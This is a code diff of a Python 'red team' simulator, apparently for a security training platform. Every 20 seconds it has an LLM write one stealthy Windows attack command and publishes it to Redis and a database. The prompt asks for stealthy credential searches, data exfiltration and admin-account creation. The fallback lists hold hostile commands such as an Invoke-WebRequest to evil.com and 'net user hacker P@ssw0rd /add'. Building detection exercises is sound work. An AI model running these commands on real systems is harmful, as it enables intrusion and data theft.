@@ -1,107 +1,149 @@
-import sys
-import time
 import os
+import time
+import json
 from datetime import datetime
-from openai import OpenAI
+import sys
+import random
 
 sys.path.append('/app/shared')
 from messaging import EventBus
 from database import Database
 
-# OpenAI クライアント
+# OpenAI設定
+from openai import OpenAI
 client = OpenAI(api_key=os.getenv('OPENAI_API_KEY'))
 
-def generate_attack_command():
-    """OpenAI GPT-4に攻撃コマンドを生成させる"""
+# 攻撃タイプ（ローテーション用）
+ATTACK_TYPES = [
+    {
+        'type': '機密ファイルを探索',
+        'examples': '*.pdf, *.xlsx, *.docx'
+    },
+    {
+        'type': 'パスワードファイルを探す',
+        'examples': 'password.txt, credentials.json'
+    },
+    {
+        'type': '外部サーバーにデータを送信',
+        'examples': 'Invoke-WebRequest, curl'
+    },
+    {
+        'type': '新しい管理者アカウントを作成',
+        'examples': 'net user, useradd'
+    },
+    {
+        'type': '実行中のプロセスを調査',
+        'examples': 'Get-Process, tasklist'
+    },
+    {
+        'type': 'ネットワーク接続を確認',
+        'examples': 'Get-NetTCPConnection, netstat'
+    },
+    {
+        'type': 'データを圧縮してアーカイブ',
+        'examples': 'Compress-Archive, zip'
+    },
+    {
+        'type': 'システム情報を収集',
+        'examples': 'systeminfo, Get-ComputerInfo'
+    },
+]
+
+# フォールバック用
+FALLBACK_COMMANDS = [
+    'powershell.exe Get-ChildItem C:\\ -Recurse -Filter *.pdf',
+    'cmd.exe /c dir C:\\Users /s /b | findstr password',
+    'net user hacker P@ssw0rd /add',
+    'powershell.exe Invoke-WebRequest http://evil.com/data.txt',
+    'powershell.exe Get-Process | Sort-Object CPU -Descending',
+    'powershell.exe Get-NetTCPConnection | Where-Object State -eq Established',
+    'powershell.exe Compress-Archive -Path C:\\sensitive\\ -DestinationPath C:\\temp\\data.zip',
+    'cmd.exe /c systeminfo | findstr /B /C:"OS"',
+]
+
+def generate_attack_command(attack_number):
+    """GPT-4で攻撃コマンドを生成（多様性重視）"""
+    
+    # ランダムに攻撃タイプを選択
+    attack_info = random.choice(ATTACK_TYPES)
+    
+    prompt = f"""あなたは侵入テストの専門家です。
+学生アカウントを乗っ取った攻撃者として、
+Windowsサーバーで「{attack_info['type']}」するコマンドを
+1つ生成してください。
+
+参考ツール: {attack_info['examples']}
+
+条件:
+- PowerShell または cmd.exe
+- 実行可能な正しい構文
+- 検知されにくいようにステルス性を重視
+- 1行のみ（説明不要）
+
+コマンドのみ出力:
+"""
     
     try:
+        print(f"💭 Asking GPT-4 to generate attack #{attack_number}...")
+        print(f"   Attack type: {attack_info['type']}")
+        
         response = client.chat.completions.create(
-            model="gpt-4o-mini",  # 安価で高速なモデル
-            messages=[
-                {
-                    "role": "system",
-                    "content": "You are a penetration testing expert. Generate Windows commands for security testing."
-                },
-                {
-                    "role": "user",
-                    "content": """Generate ONE Windows PowerShell or cmd command to achieve one of these goals:
-1. Search for sensitive files (PDF, Excel)
-2. Find password files
-3. Exfiltrate data to external server
-4. Create new user account
-5. Gather system information
-
-Requirements:
-- Valid PowerShell or cmd syntax
-- Single line command only
-- Stealthy approach
-- Output ONLY the command (no explanation)
-"""
-                }
-            ],
-            max_tokens=100,
-            temperature=0.9  # 高い値 = よりランダム
+            model="gpt-4o-mini",
+            messages=[{"role": "user", "content": prompt}],
+            max_tokens=150,
+            temperature=0.9  # ← 多様性を高める（0.7→0.9）
         )
         
         command = response.choices[0].message.content.strip()
         
-        # クリーニング
-        command = command.replace('\n', ' ').replace('\r', '')
-        command = command.replace('```powershell', '').replace('```cmd', '').replace('```', '')
+        # コードブロックを除去
+        if command.startswith('```'):
+            lines = command.split('\n')
+            command = '\n'.join([l for l in lines if not l.startswith('```')])
+            command = command.strip()
         
-        print(f"✅ GPT-4 generated: {command[:60]}...")
-        return command.strip()
+        print(f"✅ GPT-4 generated:  {command[:60]}...")
+        return command
         
     except Exception as e:
-        print(f"⚠️ OpenAI API Error: {e}")
-        # フォールバック
-        fallback = [
-            "powershell.exe Get-ChildItem C:\\ -Recurse -Filter *.pdf",
-            "cmd.exe /c dir C:\\Users /s /b | findstr password",
-            "powershell.exe Invoke-WebRequest http://evil.com/steal.ps1",
-            "net user hacker P@ssw0rd /add",
-        ]
-        import random
-        return random.choice(fallback)
+        print(f"⚠️ GPT-4 Error: {e}")
+        print(f"   Using fallback command...")
+        # ランダムにフォールバック選択
+        return random.choice(FALLBACK_COMMANDS)
 
 def main():
-    print("🔴 Red Team AI Starting... (Powered by GPT-4)")
+    print("🔴 Red Team Starting...")
     
-    # Redis接続
     redis_url = os.getenv('REDIS_URL', 'redis://redis:6379')
     event_bus = EventBus(redis_url)
     
-    # データベース接続
     db_url = os.getenv('DB_URL', 'postgresql://user:password@timescaledb:5432/sechack')
     db = Database(db_url)
     
     attack_number = 1
     
-    print("🤖 OpenAI GPT-4 initialized! Generating dynamic attacks...")
-    
     while True:
-        print(f"\n💭 Asking GPT-4 to generate attack #{attack_number}...")
-        command = generate_attack_command()
+        # 攻撃生成
+        command = generate_attack_command(attack_number)
         
-        attack = {
+        # 攻撃データ作成
+        attack_data = {
             'id': attack_number,
             'timestamp': datetime.now().isoformat(),
             'command': command,
-            'user': 'Student_A',
+            'user': 'Student_A'
         }
         
         # Redisに送信
-        event_bus.send_attack(attack)
+        event_bus.send_attack(attack_data)
+        print(f"📤 Sent attack: {command[:80]}...")
         
         # データベースに保存
-        try:
-            db.save_attack(attack)
-            print(f"💾 Saved to database: Attack #{attack_number}")
-        except Exception as e:
-            print(f"⚠️ DB Error: {e}")
+        db.save_attack(attack_data)
+        print(f"💾 Saved to database: Attack #{attack_number}\n")
         
         attack_number += 1
-        time.sleep(20)
+        time.sleep(20)  # 20秒待機
 
 if __name__ == '__main__':
     main()
